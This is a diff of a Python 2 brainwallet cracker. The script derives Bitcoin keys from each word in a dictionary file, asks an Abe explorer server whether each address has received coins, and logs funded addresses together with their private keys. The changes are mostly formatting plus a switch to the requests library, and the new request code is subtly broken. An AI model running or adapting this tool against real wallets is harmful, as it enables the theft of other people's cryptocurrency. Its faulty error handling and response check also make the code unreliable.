@@ -2,18 +2,23 @@
 import hashlib
 import ctypes
 import ctypes.util
-import urllib2
-import sys
 import codecs
+import requests
+from requests.packages.urllib3.exceptions import HTTPError
 
-ssl = ctypes.cdll.LoadLibrary (ctypes.util.find_library ('ssl') or 'libeay32')
+ssl = ctypes.cdll.LoadLibrary(ctypes.util.find_library('ssl') or 'libeay32')
 
-def check_result (val, func, args):
-    if val == 0: raise ValueError 
-    else: return ctypes.c_void_p (val)
+
+def check_result(val, func, args):
+    if val == 0:
+        raise ValueError
+    else:
+        return ctypes.c_void_p(val)
+
 
 ssl.EC_KEY_new_by_curve_name.restype = ctypes.c_void_p
 ssl.EC_KEY_new_by_curve_name.errcheck = check_result
+
 
 class KEY:
     def __init__(self):
@@ -64,10 +69,10 @@ class KEY:
         return mb.raw
 
     def get_secret(self):
-        bn = ssl.EC_KEY_get0_private_key(self.k);
+        bn = ssl.EC_KEY_get0_private_key(self.k)
         bytes = (ssl.BN_num_bits(bn) + 7) / 8
         mb = ctypes.create_string_buffer(bytes)
-        n = ssl.BN_bn2bin(bn, mb);
+        n = ssl.BN_bn2bin(bn, mb)
         return mb.raw.rjust(32, chr(0))
 
     def set_compressed(self, compressed):
@@ -78,22 +83,27 @@ class KEY:
             form = self.POINT_CONVERSION_UNCOMPRESSED
         ssl.EC_KEY_set_conv_form(self.k, form)
 
+
 def dhash(s):
     return hashlib.sha256(hashlib.sha256(s).digest()).digest()
+
 
 def rhash(s):
     h1 = hashlib.new('ripemd160')
     h1.update(hashlib.sha256(s).digest())
     return h1.digest()
 
+
 b58_digits = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
+
 
 def base58_encode(n):
     l = []
     while n > 0:
         n, r = divmod(n, 58)
-        l.insert(0,(b58_digits[r]))
+        l.insert(0, (b58_digits[r]))
     return ''.join(l)
+
 
 def base58_decode(s):
     n = 0
@@ -102,6 +112,7 @@ def base58_decode(s):
         digit = b58_digits.index(ch)
         n += digit
     return n
+
 
 def base58_encode_padded(s):
     res = base58_encode(int('0x' + s.encode('hex'), 16))
@@ -112,6 +123,7 @@ def base58_encode_padded(s):
         else:
             break
     return b58_digits[0] * pad + res
+
 
 def base58_decode_padded(s):
     pad = 0
@@ -126,10 +138,12 @@ def base58_decode_padded(s):
     res = h.decode('hex')
     return chr(0) * pad + res
 
+
 def base58_check_encode(s, version=0):
     vs = chr(version) + s
     check = dhash(vs)[:4]
     return base58_encode_padded(vs + check)
+
 
 def base58_check_decode(s, version=0):
     k = base58_decode_padded(s)
@@ -140,6 +154,7 @@ def base58_check_decode(s, version=0):
     if version != ord(v0):
         raise BaseException('version mismatch')
     return data
+
 
 def gen_eckey(passphrase=None, secret=None, pkey=None, compressed=False, rounds=1):
     k = KEY()
@@ -155,6 +170,7 @@ def gen_eckey(passphrase=None, secret=None, pkey=None, compressed=False, rounds=
     k.set_compressed(compressed)
     return k
 
+
 def get_addr(k):
     pubkey = k.get_pubkey()
     secret = k.get_secret()
@@ -165,6 +181,7 @@ def get_addr(k):
         payload = secret + chr(1)
     pkey = base58_check_encode(payload, 128)
     return addr, pkey
+
 
 def test():
     # random uncompressed
@@ -180,10 +197,11 @@ def test():
     # by private key, compressed
     print get_addr(gen_eckey(pkey='L3ATL5R9Exe1ubuAnHVgNgTKZEUKkDvWYAWkLUCyyvzzxRjtgyFe'))
 
+
 if __name__ == '__main__':
     dict_file = "dictionary.txt"
     found_file = "found_addresses.txt"
-    abe_server = "localhost"
+    abe_server = "192.168.1.232"
     abe_port = "2750"
     abe_chain = "Bitcoin"
     print "Starting search for used brainwallet addresses using dictionary '%s'" % dict_file
@@ -191,21 +209,29 @@ if __name__ == '__main__':
     num_lines = sum(1 for line in open(dict_file))
 
     line_count = 0
-    found = codecs.open(found_file,'a','utf8')
-    dictionary = codecs.open(dict_file,'r','utf8')
+    found = codecs.open(found_file, 'a', 'utf8')
+    dictionary = codecs.open(dict_file, 'r', 'utf8')
     for raw_line in dictionary:
         line_count += 1
         line = raw_line.rstrip()
         a = get_addr(gen_eckey(passphrase=line))
         address = a[0]
         private_address = a[1]
-        received_bitcoins = urllib2.urlopen("http://%s:%s/chain/%s/q/getreceivedbyaddress/%s" % (abe_server, abe_port, abe_chain, address)).read()
-        if(received_bitcoins != "0"):
-            msg = "Found address %s using dictionary word %s which has received %s bitcoins. Private key: %s\n" % (address, line.rstrip(), received_bitcoins, private_address)
+        received_bitcoins = requests.get(
+            "http://{0:s}:{1:s}/chain/{2:s}/q/getreceivedbyaddress/{3:s}".format(abe_server, abe_port, abe_chain,
+                                                                                 address))
+        try:
+            received_bitcoins.raise_for_status()
+        except HTTPError as e:
+            print('GET request error: {}'.format(e))
+            continue
+        if received_bitcoins.content():
+            msg = "Found address %s using dictionary word %s which has received %s bitcoins. Private key: %s\n" % (
+            address, line.rstrip(), received_bitcoins, private_address)
             print msg
             found.write(msg)
-        if( (line_count % 1000) == 0 ):
+        if (line_count % 1000) == 0:
             print "Progress: %s of %s words checked so far" % (line_count, num_lines)
-            
+
     found.close()
     dictionary.close()
